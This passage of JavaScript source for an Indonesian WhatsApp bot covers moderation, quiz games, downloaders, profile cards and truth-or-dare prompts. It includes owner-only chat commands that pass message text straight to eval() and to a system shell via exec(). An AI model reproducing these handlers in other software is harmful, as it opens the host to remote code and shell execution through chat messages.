let alasan = args.split('|')[1]
const isBane = banned.includes(who)
if (isBane) return reply('*Pengguna Sudah Di Ba+n Sebelumnya*')
banned.push(who)
fs.writeFileSync('./database/banned.json', JSON.stringify(banned))
reply(`Pengguna Berhasil Di Ban`)
conn.sendMessage(who, { text: `Halo Kamu Telah Di Ban Oleh Owner , Karna Melakukan ${alasan ? `${alasan}` : 'Hal Yang Buruk.'}`}, { quoted: fkontak })
}
break

case 'unban': {
if (!args[0] === 0) return reply(`Tag Pengguna, Atau Masukan Nomer Pengguna, *.ban (nomer atau tag)*`)
let who
    if (m.isGroup) who = m.mentionedJid[0] ? m.mentionedJid[0] : args[0] + '@s.whatsapp.net'
    else who = args[0] + '@s.whatsapp.net'
const isBane = banned.includes(who)  
if (!isBane) return reply('*Pengguna Ini Telah Di hapus Dari Ban*')
let delbans = banned.indexOf(who)
banned.splice(delbans, 1)
fs.writeFileSync('./database/banned.json', JSON.stringify(banned))
reply(`*Pengguna Berhasil Di Unban*`)
}
break

case 'tebak': {
                if (args[0] === "lagu") {
                    if (tebaklagu.hasOwnProperty(m.sender.split('@')[0])) return "Masih Ada Sesi Yang Belum Diselesaikan!"
                    let anu = await fetchJson('https://fatiharridho.github.io/tebaklagu.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    let msg = await conn.sendMessage(m.chat, {
                        audio: {
                            url: result.link_song
                        },
                        mimetype: 'audio/mpeg'
                    }, {
                        quoted: fvn
                    })
                    conn.sendText(m.chat, `Lagu Tersebut Adalah Lagu dari?\n\nArtist : ${result.artist}\nWaktu : 60s`, msg).then(() => {
                        tebaklagu[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                    })
                    await sleep(60000)
                    if (tebaklagu.hasOwnProperty(m.sender.split('@')[0])) {
                        console.log("Jawaban: " + result.jawaban)
 reply(`Waktu Habis, Jawabannya Adalah ${result.jawaban}`)                            
                        delete tebaklagu[m.sender.split('@')[0]]
                    }
                } else if (args[0] === 'kata') {
if (tebakkata.hasOwnProperty(m.chat)) return reply("Masih Ada Sesi Yang Belum Diselesaikan!")
                    let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkata.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
 reply(`${result.soal}\n\nJawab Soal Diatas Waktu 60s`).then(() => {
                    tebakkata[m.chat] = result.jawaban.toLowerCase()
                    })
                    await sleep(60000)
                    if (tebakkata.hasOwnProperty(m.chat)) {
                    console.log("Jawaban: " + result.jawaban)
                    reply(`Waktu Habis\nJawaban: ${tebakkata[m.chat]}`)
                    delete tebakkata[m.chat]
                    }
                  } else if (args[0] === 'gambar') {
                if (tebakgambar.hasOwnProperty(m.sender.split('@')[0])) return  reply("Masih Ada Sesi Yang Belum Diselesaikan!")
                    let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakgambar.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    conn.sendImage(m.chat, result.img, `Silahkan Jawab Soal Di Atas Ini\n\nDeskripsi : ${result.deskripsi}\nWaktu : 60s`, m).then(() => {
                    tebakgambar[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                    })
                    await sleep(60000)
                    if (tebakgambar.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Jawaban: " + result.jawaban)
                    reply(`Waktu Habis\nJawaban:  ${tebakgambar[m.sender.split('@')[0]]}`)
                    delete tebakgambar[m.sender.split('@')[0]]
                    }
                    } else if (args[0] === 'kalimat') {
                    if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0])) return "Masih Ada Sesi Yang Belum Diselesaikan!"
                    let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkalimat.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    conn.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\n${result.soal}\nWaktu : 60s`, fkontak).then(() => {
                        tebakkalimat[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                    })
                    await sleep(60000)
                    if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0])) {
                        console.log("Jawaban: " + result.jawaban)
 reply(`Waktu Habis, Jawabannya Adalah ${result.jawaban}`)                            
                        delete tebakkalimat[m.sender.split('@')[0]]
                    }
                } else if (args[0] === 'lirik') {
                    if (tebaklirik.hasOwnProperty(m.sender.split('@')[0])) return "Masih Ada Sesi Yang Belum Diselesaikan!"
                    let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebaklirik.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    conn.sendText(m.chat, `Ini Adalah Lirik Dari Lagu? : *${result.soal}*?\nWaktu : 60s`, fkontak).then(() => {
                        tebaklirik[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                    })
                    await sleep(60000)
                    if (tebaklirik.hasOwnProperty(m.sender.split('@')[0])) {
                        console.log("Jawaban: " + result.jawaban)
 reply(`Waktu Habis, Jawabannya Adalah ${result.jawaban}`)                            
                        delete tebaklirik[m.sender.split('@')[0]]
                    }
                } else if (args[0] === 'tebakan') {
                    if (tebaktebakan.hasOwnProperty(m.sender.split('@')[0])) return "Masih Ada Sesi Yang Belum Diselesaikan!"
                    let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebaktebakan.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    conn.sendText(m.chat, `Jawablah Pertanyaan Berikut : *${result.soal}*?\nWaktu : 60s`, fkontak).then(() => {
                        tebaktebakan[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                    })
                    await sleep(60000)
                    if (tebaktebakan.hasOwnProperty(m.sender.split('@')[0])) {
                        console.log("Jawaban: " + result.jawaban)
 reply(`Waktu Habis, Jawabannya Adalah ${result.jawaban}`)    
                        delete tebaktebakan[m.sender.split('@')[0]]
                    }
                } else if (args[0] === 'lontong') {
                    if (caklontong.hasOwnProperty(m.sender.split('@')[0])) return "Masih Ada Sesi Yang Belum Diselesaikan!"
                    let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/caklontong.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    conn.sendText(m.chat, `*Jawablah Pertanyaan Berikut :*\n${result.soal}*\nWaktu : 60s`, fkontak).then(() => {
                        caklontong[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                        caklontong_desk[m.sender.split('@')[0]] = result.deskripsi
                    })
                    await sleep(60000)
                    if (caklontong.hasOwnProperty(m.sender.split('@')[0])) {
                        console.log("Jawaban: " + result.jawaban)
 reply(`Waktu Habis, Jawabannya Adalah ${result.jawaban}`)                       
                        delete caklontong[m.sender.split('@')[0]]
                        delete caklontong_desk[m.sender.split('@')[0]]
                    }
                } else if (args[0] === 'bendera') {
                    if (tebakbendera.hasOwnProperty(m.sender.split('@')[0])) return "Masih Ada Sesi Yang Belum Diselesaikan!"
                    let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakbendera.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    conn.sendImage(m.chat, result.img, `Silahkan Jawab Gambar Berikut\n\nClue : ${result.flag}\nWaktu : 60s`, fkontak).then(() => {
                        tebakbendera[m.sender.split('@')[0]] = result.name.toLowerCase()
                    })
                    await sleep(60000)
                    if (tebakbendera.hasOwnProperty(m.sender.split('@')[0])) {
                        console.log("Jawaban: " + result.name)
  reply(`Waktu Habis, Jawabannya Adalah ${result.name}`)
  delete tebakbendera[m.sender.split('@')[0]]
                    }
                } else if (args[0] === 'bendera2') {
                    if (tebakbendera2.hasOwnProperty(m.sender.split('@')[0])) return "Masih Ada Sesi Yang Belum Diselesaikan!"
                    let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakbendera2.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    conn.sendImage(m.chat, result.img, `Silahkan Jawab Gambar Berikut\n\nWaktu : 60s`, fkontak).then(() => {
                        tebakbendera2[m.sender.split('@')[0]] = result.name.toLowerCase()
                    })
                    await sleep(60000)
                    if (tebakbendera2.hasOwnProperty(m.sender.split('@')[0])) {
                        console.log("Jawaban: " + result.name)
 reply(`Waktu Habis, Jawabannya Adalah ${result.name}`)    
                        delete tebakbendera2[m.sender.split('@')[0]]
                    }
                } else if (args[0] === 'kabupaten') {
                    if (tebakkabupaten.hasOwnProperty(m.sender.split('@')[0])) return "Masih Ada Sesi Yang Belum Diselesaikan!"
                    let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkabupaten.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    conn.sendImage(m.chat, result.url, `Silahkan Jawab Gambar Berikut\n\nWaktu : 60s`, fkontak).then(() => {
                        tebakkabupaten[m.sender.split('@')[0]] = result.title.toLowerCase()
                    })
                    await sleep(60000)
                    if (tebakkabupaten.hasOwnProperty(m.sender.split('@')[0])) {
                        console.log("Jawaban: " + result.title)
 reply(`Waktu Habis, Jawabannya Adalah ${result.title}`)                            
                        delete tebakkabupaten[m.sender.split('@')[0]]
                    }
                } else if (args[0] === 'kimia') {
                    if (tebakkimia.hasOwnProperty(m.sender.split('@')[0])) return "Masih Ada Sesi Yang Belum Diselesaikan!"
                    let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkimia.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    conn.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\nUnsur : ${result.unsur}\nWaktu : 60s`, fkontak).then(() => {
                        tebakkimia[m.sender.split('@')[0]] = result.lambang.toLowerCase()
                    })
                    await sleep(60000)
                    if (tebakkimia.hasOwnProperty(m.sender.split('@')[0])) {
                        console.log("Jawaban: " + result.lambang)
  reply(`Waktu Habis, Jawabannya Adalah ${result.lambang}`)                           
                        delete tebakkimia[m.sender.split('@')[0]]
                    }
                } else if (args[0] === 'asahotak') {
                if (tebakasahotak.hasOwnProperty(m.sender.split('@')[0])) return "Masih Ada Sesi Yang Belum Diselesaikan!"
                let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/asahotak.json')
                let result = anu[Math.floor(Math.random() * anu.length)]
                conn.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\nSoal : ${result.soal}\nWaktu : 60s`, fkontak).then(() => {
                    tebakasahotak[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                    })
                    await sleep(60000)
                    if (tebakasahotak.hasOwnProperty(m.sender.split('@')[0])) {
                        console.log("Jawaban: " + result.jawaban)
 reply(`Waktu Habis, Jawabannya Adalah ${result.jawaban}`)    
                        delete tebakasahotak[m.sender.split('@')[0]]
                    }
                } else if (args[0] === 'siapakahaku') {
                if (tebaksiapakahaku.hasOwnProperty(m.sender.split('@')[0])) return "Masih Ada Sesi Yang Belum Diselesaikan!"
                let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/siapakahaku.json')
                let result = anu[Math.floor(Math.random() * anu.length)]
                conn.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\nSoal : ${result.soal}\nWaktu : 60s`, fkontak).then(() => {
                    tebaksiapakahaku[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                    })
                    await sleep(60000)
                    if (tebaksiapakahaku.hasOwnProperty(m.sender.split('@')[0])) {
                        console.log("Jawaban: " + result.jawaban)
                         reply(`Waktu Habis, Jawabannya Adalah ${result.jawaban}`)    
                        delete tebaksiapakahaku[m.sender.split('@')[0]]
                    }
                } else if (args[0] === 'susunkata') {
                if (tebaksusunkata.hasOwnProperty(m.sender.split('@')[0])) return "Masih Ada Sesi Yang Belum Diselesaikan!"
                let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/susunkata.json')
                let result = anu[Math.floor(Math.random() * anu.length)]
                conn.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\nSoal : ${result.soal}\nTipe : ${result.tipe}\nWaktu : 60s`, fkontak).then(() => {
                    tebaksusunkata[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                    })
                    await sleep(60000)
                    if (tebaksusunkata.hasOwnProperty(m.sender.split('@')[0])) {
                        console.log("Jawaban: " + result.jawaban)
                         reply(`Waktu Habis, Jawabannya Adalah ${result.jawaban}`)    
                        delete tebaksusunkata[m.sender.split('@')[0]]
                    }
                } else if (args[0] === 'tekateki') {
                if (tebaktekateki.hasOwnProperty(m.sender.split('@')[0])) return "Masih Ada Sesi Yang Belum Diselesaikan!"
                let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tekateki.json')
                let result = anu[Math.floor(Math.random() * anu.length)]
                conn.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\nSoal : ${result.soal}\nWaktu : 60s`, fkontak).then(() => {
                    tebaktekateki[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                    })
                    await sleep(60000)
                     reply(`Waktu Habis, Jawabannya Adalah ${result.jawaban}`)    
                        delete tebaktekateki[m.sender.split('@')[0]]
                    }
                }
            break
            case 'kuismath':
            case 'math': {
                if (kuismath.hasOwnProperty(m.sender.split('@')[0])) return "Masih Ada Sesi Yang Belum Diselesaikan!"
                let {
                    genMath,
                    modes
                } = require('./src/math')
                if (!text) return `Mode: ${Object.keys(modes).join(' | ')}\nContoh penggunaan: ${prefix}math medium`
                let result = await genMath(text.toLowerCase())
                conn.sendText(m.chat, `*Berapa hasil dari: ${result.soal.toLowerCase()}*?\n\nWaktu: ${(result.waktu / 1000).toFixed(2)} detik`, fkontak).then(() => {
                    kuismath[m.sender.split('@')[0]] = result.jawaban
                })
                await sleep(result.waktu)
                if (kuismath.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Jawaban: " + result.jawaban)
                    m.reply("Waktu Habis\nJawaban: " + kuismath[m.sender.split('@')[0]])
                    delete kuismath[m.sender.split('@')[0]]
                }
            }
            break
case 'ttmp3': case 'ttmusic': case 'tiktokmusic': {
if (!text) return reply(`Masukan Link/Url`)
let response = await axios.get(`https://api.lolhuman.xyz/api/tiktokmusic?apikey=${apilol}&url=${text}`)
let data = response.data
if (data.status === 200 && data.message === 'success') {
let hasil = data.result
let img = 'https://telegra.ph/file/262d7066e3459153d287a.jpg'
conn.sendMessage(m.chat, {
audio: {
url: hasil
},
mimetype: 'audio/mpeg',
contextInfo: {
externalAdReply: {
title: `Tiktok mp3 Downloader`,
body: "",
thumbnailUrl: img,
sourceUrl: sig,
mediaType: 1,
showAdAttribution: true,
renderLargerThumbnail: true
}
}
}, {
quoted: m
});
} else {
reply(`Gagal Mendapatkan Respon Server`)
}
}
break
case 'levelup': {
let user = global.db.data.users[m.sender]
try {
ppexp = await conn.profilePictureUrl(m.sender, 'image')
} catch {
ppexp = "https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60"
}

  if (!levelling.canLevelUp(user.level, user.exp, global.multiplier)) {
    let { min, xp, max } = levelling.xpRange(user.level, global.multiplier)
    let expneed = xp
let expnow = user.exp - min
let levelnow = user.level
  let prog = `@${m.sender.split('@')[0]} Membutuhkan *${max - user.exp}* Exp Lagi Untuk Ke Level *${user.level} (${user.exp - min}/${xp}*)`
sendImageMentionsBuffer(await progres(ppexp, pushname, expneed, expnow, levelnow), prog, m)
  }
  let before = user.level * 1
	while (levelling.canLevelUp(user.level, user.exp, global.multiplier)) user.level++
	if (before !== user.level) {
addMonay(m.sender, 1000)
let asa = `Selamat @${m.sender.split`@`[0]} anda telah naik level!\n*${before}* ➠ *${user.level}*\n\nAnda mendapatkan +1000 money\n\ngunakan *.my* untuk mengecek`
sendImageMentionsBuffer(await levelUp(ppexp), asa, m)
        }
        }
break
case 'my': case 'me': {
let who
    if (m.isGroup) who = m.mentionedJid[0] ? m.mentionedJid[0] : m.sender
    else who = m.sender
    let userj = global.db.data.users[who]
let days = Math.abs(Math.floor((global.db.data.users[who].premiumDate - new Date()) / (24 * 60 * 60 * 1000)));
			let hours = Math.abs(Math.floor((global.db.data.users[who].premiumDate - new Date()) / (60 * 60 * 1000))) % 24;
			let minutes = Math.abs(Math.floor((global.db.data.users[who].premiumDate - new Date()) / (60 * 1000))) % 60;
    let premiumExpired = userj.premium ? `${days} Hari ${hours} Jam ${minutes} Menit` : "Not a premium";
    const isMemek = global.db.data.users[who].premium
    const isBagn = banned.includes(who)
    const isRegisteredd = checkRegisteredUser(who)
    let atm = userj.atm
let caption = `乂 *I N F O R M A T I O N  ${isRegisteredd ? `${NamaKamu(who).toUpperCase()}` : `Tidak Terdeteksi`}*

╭ Name: ${isRegisteredd ? `${NamaKamu(who)}` : `Tidak Terdeteksi`}
│ Umur:  ${isRegisteredd ? `${UmurKamu(who)}` : `Tidak Terdeteksi`}
│ Premium: ${isMemek}
│ Atm: ${atm}
│ PremiumExpired: ${premiumExpired}
│ Banned: ${isBagn ? `Iya` : `Tidak`}
│ Level: ${userj.level}
│ Role: ${userj.role}
╰ Exp: ${userj.exp}`
conn.sendMessage(m.chat, { text: caption, contextInfo: {
    externalAdReply: {
      title: "乂 P R O F I L E",
      body: 'This is your profile, name information, limits and top leaderboard',
      thumbnailUrl: ppUrl,
      sourceUrl: sig,
      mediaType: 1,
      showAdAttribution: true,
      renderLargerThumbnail: true
    }
  }}, { quoted: m });
}
break
case 'ship': case 'cinta': {
let tag1 = m.mentionedJid[0];
    let tag2 = m.mentionedJid[1];
let capt = `@${tag1.split('@')[0]} Dengan @${tag2.split('@')[0]}  Cie Cieee`
let avatar1url = await conn.profilePictureUrl(tag1, 'image').catch(_ => 'https://cdn.jsdelivr.net/gh/SazumiVicky/MakeMeow-Storage@main/avatar_contact.png')
let avatar2url = await conn.profilePictureUrl(tag2, 'image').catch(_ => 'https://cdn.jsdelivr.net/gh/SazumiVicky/MakeMeow-Storage@main/avatar_contact.png')
const ship = await new canvafy.Ship()
    .setAvatars(avatar1url, avatar2url)
    .setBackground("image", "https://th.bing.com/th/id/R.248b992f15fb255621fa51ee0ca0cecb?rik=K8hIsVFACWQ8%2fw&pid=ImgRaw&r=0")
    .setBorder("#f0f0f0")
    .setOverlayOpacity(0.5)
    .build();
    await conn.sendMessage(m.chat, { image: ship, caption: capt, mentions: [tag1, tag2] }, { quoted: m });
}
break
case '>_': {
                    if (!isCreator) return replycus(mess.owner, 'Access Denies', 'https://telegra.ph/file/3847c6c65ec0503456cca.jpg')
                    try {
                        let evaled = await eval(budy.slice(2))
                        if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
                        await newReply(evaled)
                    } catch (err) {
                        await newReply(String(err))
                    }
                    }
                    break
                   case '=>_': {
                   if (!isCreator) return replycus(mess.owner, 'Access Denies', 'https://telegra.ph/file/3847c6c65ec0503456cca.jpg')

                    function Return(sul) {
                        sat = JSON.stringify(sul, null, 2)
                        bang = util.format(sat)
                        if (sat == undefined) {
                            bang = util.format(sul)
                        }
                        return newReply(bang)
                    }
                    try {
                        newReply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
                    } catch (e) {
                        newReply(String(e))
                    }
                }
                break
                case '$_': {
                                    if (!isCreator) return replycus(mess.owner, 'Access Denies', 'https://telegra.ph/file/3847c6c65ec0503456cca.jpg')
                    exec(budy.slice(2), (err, stdout) => {
                        if (err) return newReply(err)
                        if (stdout) return newReply(stdout)
                    })
                }
                break
                
case 'rename': {
let umur = args[1]
if (!isRenameCard) return reply(`Kamu Tidak Mempunyai RenameCard`)
if (!args[0]) return reply(`Masukan Text , Yang Ingin Dijadikan Nama Profilmu`)
if (!umur) return reply(`Masukan Input Seperti Ini .rename <nama> <umur>`)
global.db.data.users[m.sender].rename -= 1
delRegister(m.sender)
let sn = crypto.createHash('md5').update(m.sender).digest('hex');
let umurY = umur
addRegisteredUser(m.sender, args[0], umurY, sn)
reply(`Berhasil!`)
}
break
case 'getrenamecard': {
if (isRenameCard) return reply(`Max Rename Card Hanya 1`)
global.db.data.users[m.sender].rename += 1
reply(`Rename Card Sudah Ditambahkan`)
}
break
case 'pixiv': {
if (!text) return reply(`Example: ${prefix}${command} anime`)

  conn.sendMessage(m.chat, {
    react: {
      text: '🕒',
      key: m.key,
    }
  })

  let url = `https://api.lolhuman.xyz/api/pixiv?apikey=${apilol}&query=${encodeURIComponent(text)}`
  axios.get(url)
    .then(function (response) {
      let images = response.data.result
      if (images.length == 0) {
        reply(`Tidak Ada Media Yang Di Temukan!`)
      } else {
        let index = Math.floor(Math.random() * images.length)
        let image = images[index]
        conn.sendFile(m.chat, image.image, 'pixiv.jpg', image.title, m)
        
      }
    })
    .catch(function (error) {
      console.log(error)
      reply('An error occurred while processing the request. Please try again later.')
    })
}
break
case 'npm': case 'npmsearch': {
	if (!text) throw 'Input Query'
	let res = await fetch(`http://registry.npmjs.com/-/v1/search?text=${text}`)
	conn.sendMessage(m.chat, {
		react: {
			text: '🕒',
			key: m.key,
		}
	})
	let { objects } = await res.json()
	if (!objects.length) return reply(`Query "${text}" not found :/`)
	let txt = objects.map(({ package: pkg }) => {
		return `*${pkg.name}* (v${pkg.version})\n_${pkg.links.npm}_\n_${pkg.description}_`
	}).join`\n\n`
	reply(`乂 *N P M  S E A R C H*\n\n` + txt)
}
break

case 'spotifysearch': {
async function getSpotifySearch(query) {
  try {
    const url = `https://api.lolhuman.xyz/api/spotifysearch?apikey=${apilol}&query=${encodeURIComponent(query)}`;
    const response = await axios.get(url);
    return response.data;
  } catch (error) {
    console.error('Error fetching Spotify data:', error);
    return null;
  }
}

  if (!text) return reply(`*Example*: .${command} perang`);

	conn.sendMessage(m.chat, {
		react: {
			text: '🕒',
			key: m.key,
		}
	})

  try {
    const spotifyData = await getSpotifySearch(text);
    if (!spotifyData || spotifyData.status !== 200) return m.reply('Terjadi Kesalahan.');

    const { result } = spotifyData;
    if (result.length === 0)return m.reply('Lagu Tidak Ditemukan.');

    const replyMessage = result.map((song, index) => {
      return `
${index + 1}. *${song.title}* - ${song.artists}
◦ *Link:* ${song.link}
◦ *Durasi:* ${song.duration} detik
◦ *Populeritas:* ${song.popularity}
◦ *Preview:* ${song.preview_url}
      `;
    }).join('\n');
conn.sendMessage(m.chat, { text: replyMessage, contextInfo: {
    externalAdReply: {
      title: "Spotify Search",
      body: 'Made By ArybotzNishimura',
      thumbnailUrl: 'https://telegra.ph/file/ea987b2375cb7088b0d41.jpg',
      sourceUrl: sig,
      mediaType: 1,
      showAdAttribution: true,
      renderLargerThumbnail: true
    }
  }}, { quoted: m });
  } catch (error) {
    console.error('Error handling Spotify command:', error);
    m.reply('Terjadi Kesalahan Pada Server');
  }
}
break

case 'spotifyfdl': case 'spotifydl': {
  if (!text) return reply(`Input Link Spotify.`);
  reply(mess.wait);
  let res = await fetch(`https://api.yanzbotz.my.id/api/downloader/spotify?url=${text}`);
  let jsons = await res.json();
  const {
    album,
    artist,
    duration,
    download,
    image,
    name,
    format
  } = await jsons.result.data.metadata;

  let captionvid = ` ∘ Title: ${name}\n∘ artist: ${artist}\n∘ Duration: ${duration}\n∘ Image: ${image}\n∘ Url: ${download}`;

  const p = await new canvafy.Spotify()
    .setTitle(name)
    .setAuthor("Spotify Downloader")
    .setTimestamp(40, 100)
    .setOverlayOpacity(0.8)
    .setBorder("#fff", 0.8)
    .setImage(image)
    .setBlur(3)
    .build();

  conn.sendFile(m.chat, p, '', captionvid, m);
  conn.sendMessage(m.chat, { audio: { url: download }, mimetype: 'audio/mpeg', contextInfo: {
    externalAdReply: {
      title: "Spotify Downloaders",
      body: 'Made By AryBotz',
      thumbnailUrl: image,
      sourceUrl: sig,
      mediaType: 1,
      showAdAttribution: true,
      renderLargerThumbnail: true
    }
  }}, { quoted: m });
};
break

case 'updateinfo': case 'bioinfo': {
  if (!text) return reply(`*Example*: ${command} Tidak Bisa Bicara WhatsApp Saja`)
  await conn.updateProfileStatus(text);
  m.reply('Berhasil Mengganti Profile Info.');
}
break
case 'dare': {
let img = 'https://i.ibb.co/305yt26/bf84f20635dedd5dde31e7e5b6983ae9.jpg'
	let dares = [
"Foto kuburan tengah malam berani ga?",
"Ambil foto bot, jadikan foto profil kamu selama 1 hari",
"VN nyanyi balonku ada 5",
"Minum Coca-Cola sampai habis tanpa sendawa selama 30 detik",
"Makan 1 Cabe tanpa minum, tanpa gorengan selama 2 menit",
"Celupin hp kamu ke air selama 30 detik",
"VN *Aku sayang kamu*",
"Nyanyi potong bebek angsa (VN)",
"Kirim pesan ke mantan kamu dan bilang _aku masih suka sama kamu_",
"Telfon crush/pacar sekarang dan ss ke pemain",
"Pap ke salah satu anggota grup",
"Pap apa yang di depan kamu",
"SS recent call whatsapp",
"Kirim voice note bilang can i call u baby?",
"Pake foto sule sampe 3 hari'",
"Ketik pake bahasa daerah 24 jam",
"Ganti nama menjadi _gue anak lucinta luna_ selama 5 jam",
"Chat ke kontak wa urutan sesuai %batre kamu, terus bilang ke dia _i lucky to hv you_",
"Prank chat mantan dan bilang *i love u, pgn balikan*",
"Record voice baca surah al-kautsar",
"Ganti nama jadi *BOWO* selama 24 jam",
"Sebutkan tipe pacar mu!",
"VN *aku mencintaimu*",
"Kamu harus pap sekarang!",
"Kamu harus bagi bagi limit, minimal 2 setiap pengguna",
"Chatingan selama 1 jam harus 4l4Y 8AN93T"
] // tambahin kata kata sendiri 
let der = dares[Math.floor(Math.random() * dares.length)]
	conn.sendFile(m.chat, img, 'dare.png', `*DARE*\n\n“${der}”`, m)
}
break
case 'truth': {
	let img = 'https://i.ibb.co/305yt26/bf84f20635dedd5dde31e7e5b6983ae9.jpg'
    let trut = [
"Pernah ngambil uang ortu apa ga?",
"Pernah bohong sama ortu apa aja?\nCoba ceritakan tentang kebohongannya",
"Apa makanan yang kamu sukai?",
"Siapa yang mau di jadikan pacar di gc ini?",
"Apa mimpi terburukmu?",
"Apa hal paling memalukan dari temanmu?",
"Pernah suka sama siapa aja? berapa lama?",
"Kalau boleh atau kalau mau, di gc/luar gc siapa yang akan kamu jadikan sahabat?(boleh beda/sma jenis)",
"Apa ketakutan terbesar kamu?",
"Pernah suka sama orang dan merasa orang itu suka sama kamu juga?",
"Siapa nama mantan pacar teman mu yang pernah kamu sukai diam diam?",
"Pernah gak nyuri uang nyokap atau bokap? Alesanya?",
"Hal yang bikin seneng pas lu lagi sedih apa?",
"Pernah cinta bertepuk sebelah tangan? kalo pernah sama siapa? rasanya gimana brou?",
"Pernah jadi selingkuhan orang?",
"Hal yang paling ditakutin",
"Siapa orang yang paling berpengaruh kepada kehidupanmu",
"Hal membanggakan apa yang kamu dapatkan di tahun ini",
"Siapa orang yang bisa membuatmu sange :v",
"Sapa orang yang pernah buatmu sange",
"(bgi yg muslim) pernah ga solat seharian?",
"Siapa yang paling mendekati tipe pasangan idealmu di sini",
"Suka mabar(main bareng)sama siapa?",
"Pernah nolak orang? alasannya kenapa?",
"Sebutkan kejadian yang bikin kamu sakit hati yang masih di inget",
"Pencapaian yang udah didapet apa aja ditahun ini?",
"Kebiasaan terburuk lo pas di sekolah apa?",
"Siapa nama mantan yang bikin lo sakit hati?"
]  // tambahin kata kata sendiri 
let tru = trut[Math.floor(Math.random() * trut.length)]
	conn.sendFile(m.chat, img, 'truth.png', `*TRUTH*\n\n“${tru}”`, m)
}
break
case 'gimage': {
  if (!text) return reply(`${command} anime`)

  let apiUrl = `https://api.lolhuman.xyz/api/gimage?apikey=${apilol}&query=${encodeURIComponent(text)}`

  try {
	conn.sendMessage(m.chat, {
		react: {
			text: '🕒',
			key: m.key,
		}
	})

    let response = await fetch(apiUrl)
    if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`)

    let imageBuffer = await response.buffer()

    conn.sendFile(m.chat, imageBuffer, 'image.jpg', `🐶 Berikut Foto Anda, Dengan Text *${text}*.`, m)

  } catch (error) {
    console.error(error)
    reply(`Terjadi Kesalahan.!`)
  }
}
break 
case 'scircle': case 'circle': {
const { createCanvas, loadImage } = require('canvas');
const fs = require('fs');
  try {
    if (!m.quoted || !m.quoted.mimetype.includes('image')) {
      reply('Reply Image Dengan Caption *.scircle*');
    }
    conn.sendMessage(m.chat, {
      react: {
        text: '🕒',
        key: m.key,
      }
    });
    let img = await m.quoted.download();
    let image = await loadImage(img);

    const canvas = createCanvas(image.width, image.height);
    const ctx = canvas.getContext('2d');

    ctx.arc(canvas.width / 2, canvas.height / 2, Math.min(canvas.width, canvas.height) / 2, 0, Math.PI * 2);
    ctx.clip();
    ctx.drawImage(image, 0, 0, canvas.width, canvas.height);

    let output = `circle_${m.sender}.png`;
    fs.writeFileSync(output, canvas.toBuffer());

    conn.sendImageAsSticker(m.chat, output, m, { packname: 'ArybotzMultiDevice', author: 'Ary Gamz' });

    fs.unlinkSync(output); 

  } catch (e) {
    reply(`Terjadi Error Dengan Code: ${e}`);
  }
};
break
case 'ngl': {
async function cekUser(url) {
	return await axios(url).catch(_ => null)
}

async function sendNgl(url, text) {
	return await axios({
		url,
		method: 'post',
		data: new URLSearchParams({ question: text })
	}).catch(console.log)
}
	let [user, msg] = text.split`|`
	if (!(user && msg)) return reply(`Ex: ${command} username/ngl_link | message`)
	let link = /^(http|https):\/\/ngl.link/gi.test(user) ? user : /ngl.link/gi.test(user) ? `https://${user}` : `https://ngl.link/${user}`
	let data = await cekUser(link)
	if (!data) return reply('User not found/Invalid url')
	await sendNgl(link, msg).then(() => reply(`Success send ngl to *"${user}"*\nMessage: *"${msg}"*`))
}
break
case 'database': {
let DatabaseUser = Object.keys(global.db.data.users).length
let text = `乂 *D A T A B A S E*
total database user ${DatabaseUser}`
reply(text)
}
break
case 'gbard':
case 'bard':
case 'aibard': {
if (!text) return reply(`Example: ${prefix + command} apa itu Fsolar`);

conn.sendMessage(m.chat, {
  react: {
    text: '🕘',
    key: m.key,
  }
